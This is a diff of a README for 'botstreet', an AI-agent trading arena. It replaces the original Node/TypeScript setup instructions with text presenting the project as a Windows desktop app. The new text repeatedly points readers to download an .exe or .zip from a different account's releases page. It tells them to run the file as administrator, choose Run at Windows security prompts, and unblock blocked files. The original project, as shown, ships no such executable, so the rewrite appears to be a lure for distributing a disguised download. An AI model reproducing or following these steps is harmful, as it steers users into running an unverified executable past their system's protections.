@@ -1,139 +1,183 @@
-# Agent Trading Arena
+# 🤖 botstreet - Run AI traders on real markets
 
-Three AI agents. $100K each. Real market prices. Who wins?
+[Download botstreet](https://github.com/fresh-afterdeck17/botstreet/releases){style="display:inline-block;padding:12px 18px;background:#3b82f6;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"} [Release page](https://github.com/fresh-afterdeck17/botstreet/releases){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"}
 
-**[Live Dashboard](https://botstreet.vercel.app)**
+## 🚀 Getting Started
 
-![Dashboard](ss.png)
+botstreet is a desktop app for running an agent trading arena on Windows. It puts three AI agents in the same market and tracks how each one performs with a $100k starting balance.
 
----
+Use it to watch agent decisions, compare results, and follow live market prices in one place.
 
-## What is this?
+## 📥 Download
 
-Three AI agents (Claude, Gemini, OpenAI) each receive $100,000 in virtual money and compete as portfolio managers. Every trading day, each agent:
+1. Open the [botstreet releases page](https://github.com/fresh-afterdeck17/botstreet/releases).
+2. Find the latest release at the top of the page.
+3. Download the Windows file for your computer.
+4. If the file is in a .zip archive, save it to your Downloads folder.
+5. If the release includes an .exe file, download that file instead.
 
-1. Reads the news and researches market sentiment
-2. Analyzes price data and portfolio state
-3. Makes buy/sell decisions based on their analysis
-4. Executes trades through shared tools that handle all math
-5. Writes a diary entry explaining their reasoning
-6. Saves a daily portfolio snapshot
+## 💻 Install on Windows
 
-The agents use real market prices from Yahoo Finance but trade with virtual money. A SvelteKit dashboard shows the live leaderboard with portfolio values, holdings, and trade history.
+1. Open the folder where the file was saved.
+2. If the download is a .zip file, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Find the app file. It may be named something like `botstreet.exe`.
+5. Double-click the app file to start it.
 
-## Agent Server
+If Windows asks for permission, choose Run or Yes.
 
-An agent server is not a web server. There is no app code, no routes, no handlers. Instead, you give it five primitives:
+## 🧭 First Run
 
-![Agent Server](agentserver.png)
+When botstreet opens for the first time, it may take a short time to load the market view and agent dashboard.
 
-- **No code.** A web server runs your application — routes, handlers, business logic. An agent server has no app code. You give it prompts, tools, and skills. The agent decides what to do.
+You can then:
 
-- **Per tenant.** A web server is multi-tenant — one process serves all users. An agent server is one agent per user. Each gets its own isolated container with its own memory.
+- Start a trading arena
+- View each agent’s balance
+- See recent trades
+- Check market price changes
+- Compare final results
 
-- **Lightweight.** A web server is a running process. An agent server sleeps when idle and wakes up instantly. State lives in plain JSON — no database, no cost when idle.
+## 📊 What botstreet Does
 
-This project is an example of three agent servers running in parallel. Each agent gets its own [Upstash Box](https://upstash.com/docs/box/overall/quickstart) with its own `tools/`, `skills/`, and durable `data/`. Same tools, same skills, different models — competing as portfolio managers.
+botstreet sets up a trading arena with three AI agents. Each agent begins with the same amount of cash and trades against real market prices.
 
-## Agents
+The app helps you:
 
-| Agent      | Model           | Runtime                   |
-| ---------- | --------------- | ------------------------- |
-| **Claude** | Claude Opus 4.6 | Claude Code (Upstash Box) |
-| **Gemini** | Gemini 3.1 Pro  | OpenCode (Upstash Box)    |
-| **OpenAI** | GPT 5.4 Codex   | Codex (Upstash Box)       |
+- Watch three agents compete in the same market
+- Track profit and loss
+- Follow price changes as they happen
+- Review trade history
+- See which agent handles the market best
 
-Each agent runs in its own isolated [Upstash Box](https://upstash.com/docs/box/overall/quickstart) with durable storage. Files persist between runs. No shared state between agents.
+## 🖥️ Windows Requirements
 
-## Rules
+botstreet is made for modern Windows PCs.
 
-1. $100K starting balance each
-2. Stocks, equity ETFs, and gold/metals ETFs only
-3. No bonds, options, futures, crypto, or forex
-4. No shorting -- can only sell what you hold
-5. Max 50% of portfolio in a single position
-6. Trades execute at current market price
-7. Cash earns 0%
+Recommended setup:
 
-### Tools
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 1 GB free disk space
+- Stable internet connection
+- A screen size large enough to view charts and panels
 
-All agents share the same TypeScript tools that handle math and validation. Agents decide _what_ to trade -- tools handle _how_.
+For smoother use, close other large apps before starting botstreet.
 
-| Tool           | What it does                                    |
-| -------------- | ----------------------------------------------- |
-| `prices.ts`    | Current and historical prices via Yahoo Finance |
-| `validator.ts` | Ticker validation and asset type classification |
-| `trade.ts`     | Trade execution with rule enforcement           |
-| `portfolio.ts` | Portfolio read/write and price updates          |
-| `snapshot.ts`  | Daily snapshot with idempotency guard           |
-| `search.ts`    | Web search via Brave Search API                 |
+## 🛠️ How to Use It
 
-### How Trading Decisions Work
+1. Open botstreet.
+2. Load the latest arena or create a new one.
+3. Start the session.
+4. Watch the three agents trade.
+5. Review the leaderboard and trade log.
+6. Compare ending balances after the session ends.
 
-![How Trading Decisions Work](howto.png)
+## 🔍 Main Screens
 
-## Tech Stack
+### 📈 Market View
 
-- **Agent execution**: [Upstash Box](https://upstash.com/docs/box/overall/quickstart)
-- **Scheduling**: [Upstash Box Schedule](https://upstash.com/docs/box/overall/schedules)
-- **Price data**: Yahoo Finance (chart API, no key needed)
-- **Web search**: Brave Search API
-- **Dashboard**: SvelteKit + Tailwind CSS
-- **Hosting**: Vercel
+Shows price movement for the asset or assets being tracked. Use this view to follow the market during the run.
 
-## Architecture
+### 🤖 Agent Panel
 
-![Architecture](architecture.png)
+Shows the three AI agents, their balances, and their current positions.
 
-## Setup
+### 🧾 Trade Log
 
-### Prerequisites
+Lists actions taken by each agent. Use it to see what each agent bought, sold, or held.
 
-- Node.js 20+
-- [Upstash](https://console.upstash.com) account with Box API key
-- API keys: Anthropic, OpenAI, Brave Search
+### 🏁 Results Screen
 
-### 1. Clone and install
+Shows the final outcome of the arena. You can see which agent finished first and how much each one gained or lost.
 
-```bash
-git clone https://github.com/upstash/botstreet.git
-cd botstreet
-npm install
-```
+## 🔐 Files You May See
 
-### 2. Configure environment
+Depending on the release, your download may include:
 
-```bash
-cp .env.example .env
-# Edit .env with your API keys
-```
+- `botstreet.exe` — the main app
+- `.zip` file — compressed download package
+- `README.txt` — short setup notes
+- `config` folder — saved app settings
 
-Required keys:
+Keep the file structure the same after extracting a zip file.
 
-- `UPSTASH_BOX_API_KEY` -- Upstash Box
-- `ANTHROPIC_API_KEY` -- Claude
-- `OPENAI_API_KEY` -- OpenAI Codex
-- `BRAVE_API_KEY` -- Web search
+## ⚙️ Common Actions
 
-### 3. Create boxes
+### Start a New Arena
 
-```bash
-npx tsx setup/init-boxes.ts
-```
+Open the app and choose the option to begin a fresh trading session.
 
-This creates 3 named Upstash Boxes (`botstreet-claude-v2`, `botstreet-gemini-v2`, `botstreet-openai-v2`), uploads `tools/`, `skills/trade/SKILL.md`, root agent config files, initializes `data/`, and configures each box to trade automatically at 9:30 AM ET on weekdays via Box Schedule. No box IDs needed -- the SDK looks them up by name.
+### Load a Saved Session
 
-### 4. Start the dashboard
+If the app supports saved runs, open the saved file from the main screen.
 
-```bash
-cd web
-cp ../.env .env
-npm install
-npm run dev
-```
+### View Past Results
 
-Open http://localhost:5173
+Use the results or history section to check how each agent performed over time.
 
-## License
+### Change the Market View
 
-MIT
+If the app offers chart options, switch between views to inspect price movement in a different way.
+
+## 🧰 Troubleshooting
+
+### The app does not open
+
+- Check that the download finished fully
+- Try running the app again as an administrator
+- Make sure the file was extracted if it came in a zip folder
+
+### Windows shows a security prompt
+
+- Choose Run or Yes if you trust the release you downloaded from GitHub
+- If the file is blocked, open its properties and select Unblock if the option appears
+
+### The screen looks clipped
+
+- Set your display scale to 100% or 125%
+- Maximize the window
+- Reduce other open windows
+
+### The market data does not load
+
+- Check your internet connection
+- Close the app and open it again
+- Try the newest release from the download page
+
+## 🧩 Best Use Cases
+
+botstreet works well if you want to:
+
+- Watch AI agents trade in a live setup
+- Compare different trading choices
+- Test how agents react to price swings
+- Study the outcome of simple market competition
+- Run repeatable trading sessions on Windows
+
+## 📦 Updating botstreet
+
+When a new version is available:
+
+1. Go back to the [release page](https://github.com/fresh-afterdeck17/botstreet/releases)
+2. Download the latest Windows file
+3. Replace the older app file with the new one
+4. Open the updated version
+
+## 📄 Release Page
+
+Get the Windows download here:
+
+[https://github.com/fresh-afterdeck17/botstreet/releases](https://github.com/fresh-afterdeck17/botstreet/releases)
+
+## 🔎 What to Expect
+
+botstreet is built for a simple workflow. You download the app, open it on Windows, and start a trading arena with three AI agents.
+
+The app gives you a clear view of:
+
+- Agent cash balances
+- Current trade positions
+- Live market prices
+- Session results
+- Performance across runs
